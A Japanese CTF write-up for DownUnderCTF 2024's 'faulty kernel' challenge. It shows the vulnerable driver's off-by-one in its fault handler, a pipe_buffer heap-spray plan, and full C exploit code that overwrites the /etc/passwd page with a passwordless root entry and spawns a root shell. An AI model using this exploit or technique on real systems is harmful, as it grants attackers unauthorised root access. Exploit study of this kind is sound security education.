+++
title = "DownUnderCTF 2024 | faulty kernel"
date = 2024-07-10
description = "Linux kernelなんもわからん"
[taxonomies]
tags = ["pwn", "kernel"]
+++

[DownUnderCTF](https://ctftime.org/event/2284)のupsolveです。


# Faulty Kernel
## 概要

KernelはLinux 6.10.0-rc4で、SMAP,SMEP,kASLRは有効です。

mmapとfault handlerがあるmisc deviceを登録するカーネルオブジェクトが渡されます。
```c
#define PAGECOUNT (128)

struct shared_buffer {
	pgoff_t pagecount;
	struct page** pages;
};

static struct miscdevice dev;

static struct file_operations dev_fops = {
	.owner = THIS_MODULE,
	.open = dev_open,
	.mmap = dev_mmap
};

static struct vm_operations_struct dev_vm_ops = {
	.fault = dev_vma_fault
};

static int dev_mmap(struct file* filp, struct vm_area_struct* vma) {
	struct shared_buffer* sbuf = filp->private_data;
	pgoff_t pages = vma_pages(vma);
	if (pages > sbuf->pagecount) {
		return -EINVAL;
	}

	vma->vm_ops = &dev_vm_ops;
    	vma->vm_private_data = sbuf;

	return SUCCESS;
}

static vm_fault_t dev_vma_fault(struct vm_fault *vmf) {
	struct vm_area_struct *vma = vmf->vma;
	struct shared_buffer *sbuf = vma->vm_private_data;

	pgoff_t pgoff = vmf->pgoff;

    	if (pgoff > sbuf->pagecount) {
        	return VM_FAULT_SIGBUS;
    	}

	get_page(sbuf->pages[pgoff]);
	vmf->page = sbuf->pages[pgoff];

	return SUCCESS;
}

static int dev_open(struct inode* inodep, struct file* filp) {
	int i;
	struct shared_buffer* sbuf;

	sbuf = kzalloc(sizeof(*sbuf), GFP_KERNEL);
	if (!sbuf) {
		printk(KERN_INFO "[dev] Failed to initilise buffer.\n");
		goto fail;
	}

	sbuf->pagecount = PAGECOUNT;
	sbuf->pages = kmalloc_array(sbuf->pagecount, sizeof(*sbuf->pages), GFP_KERNEL);
	if (!sbuf->pages) {
		printk(KERN_INFO "[dev] Failed to initilise buffer.\n");
		goto fail_alloc_buf;
	}

	for (i = 0; i < sbuf->pagecount; i++) {
		sbuf->pages[i] = alloc_page(GFP_KERNEL);
		if (!sbuf->pages[i]) {
			printk(KERN_ERR "[dev] Failed to allocate page %d.\n", i);
			goto fail_alloc_pages;
		}
	}

	filp->private_data = sbuf;
	return SUCCESS;

fail_alloc_pages:
	while (i--) {
		if (sbuf->pages[i]) {
			__free_page(sbuf->pages[i]);
		}
	}

	kfree(sbuf->pages);
fail_alloc_buf:
	kfree(sbuf);
fail:
	return FAIL;
}

static int dev_init(void) {
	dev.minor = MISC_DYNAMIC_MINOR;
    	dev.name = DEV_NAME;
    	dev.fops = &dev_fops;
    	dev.mode = 0644;

	if (misc_register(&dev)) {
        	return FAIL;
    	}


	printk(KERN_INFO "[dev] It's mappin' time!\n");

	return SUCCESS;
}
```
図示すると以下のような状態になっています。
{{ image(path="static/overview.png", caption="問題の概観") }}


## 脆弱性
脆弱性は`dev_vma_fault`関数にあります。 \
この関数は、pagefaultが発生した際にpgoff番目のpageを返す処理を実装していますが、`sbuf->pagecount`はpagesの個数を表しているためoff-by-oneが発生します。
```c
if (pgoff > sbuf->pagecount) {
    return VM_FAULT_SIGBUS;
}

get_page(sbuf->pages[pgoff]);
vmf->page = sbuf->pages[pgoff];
```

## 攻撃
mmap時のチェックに問題はないので、mmapに渡せる最大サイズは`PAGE *
128`となります。その後mremapを呼び、sizeを`PAGE * 129`に変更し`sbuf->pages[128]`にアクセスすると上記のOOB Readが出来ます。\
では、どのオブジェクトを隣接させると良いでしょうか？
pagesは`kmalloc_array(sbuf->pagecount, sizeof(*sbuf->pages),
GFP_KERNEL)`で確保され、これはkmalloc-1kに入ります。ということは、最初の8byteが`page*`、かつ、kmalloc-1k
sizedな構造体を探すと良さそうでこれは[pipe_buffer](https://elixir.bootlin.com/linux/v6.10-rc4/source/include/linux/pipe_fs_i.h#L26)が該当します。\
したがって、exploit時のheapの状態はこのようになっていると良さそうです。
{{ image(path="static/exploit.png", caption="exploit前のheapの状態") }}

というわけで権限昇格までの流れは以下のとおりになります。

1. kmalloc 1kを埋める
2. pipe_bufferを大量に確保
3. pipe_bufferを1つおきに開放
4. pipe_bufferの先頭要素を/etc/passwdのpageに変更
5. 問題のドライバにmmap
6. mremap
7. OOB Readを使って/etc/passwdに書き込み


## Exploit
```c
#include "./exploit.h"
#include "./common.h"

/*********** commands ******************/
#define DEV_PATH "/dev/challenge"   // the path the device is placed

#define PAGECOUNT 128

/*********** constants ******************/
// (END globals)

struct fd_pair {
  int fd[2];
};

struct fd_pair pairs[0x100];

void heap_spray() {
  for (int i = 0; i < 0x100; i++) {
    if (pipe(pairs[i].fd)) {
      errExit("pipe");
    }
  }

  for (int i = 0; i < 0x100; i++) {
    if (!(i % 2)) {
      if (close(pairs[i].fd[0]) || close(pairs[i].fd[1])) {
	errExit("close");
      }
    }
  }
}

void splice_pipe(void *addr) {
  for (int i = 0; i < 0x100; i++) {
    if (i % 2) {
      struct iovec iov = {.iov_base=addr, .iov_len=PAGE};
      if (vmsplice(pairs[i].fd[1], &iov, 1, 0) < 0) {
	errExit("vmsplice");
      }
    }
  }
}

int main(int argc, char *argv[]) {
  char *BACKDOOR = "root::0:0:root:/root:/bin/sh";
  int passwd_fd = SYSCHK(open("/etc/passwd", O_RDONLY));
  void* passwd_addr = SYSCHK(mmap(0, PAGE, PROT_READ, MAP_SHARED, passwd_fd, 0));
  printf("passwd addr: %p\n", passwd_addr);
  heap_spray();
  int fd = open(DEV_PATH, O_RDWR);
  splice_pipe(passwd_addr);

  void* old_addr = SYSCHK(mmap(0, PAGE * PAGECOUNT, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0));
  void* new_addr = SYSCHK(mremap(old_addr,PAGE * PAGECOUNT, (PAGE+1) * PAGECOUNT, MREMAP_MAYMOVE));
  char* passwd_str = (char*)new_addr+(PAGE*PAGECOUNT);
  int pid = getpid();
  memcpy(passwd_str, BACKDOOR, strlen(BACKDOOR)+1);
  system("/bin/su -");
  system("/bin/sh");

  // end of life
  puts("[ ] END of life...");
  sleep(999999);
}
```
概略はつかめると思いますが、使っているマクロの詳細などを知りたい方は[GitHub](https://github.com/rqdaA/kernel-ctf/tree/master/faulty_kernel)まで。
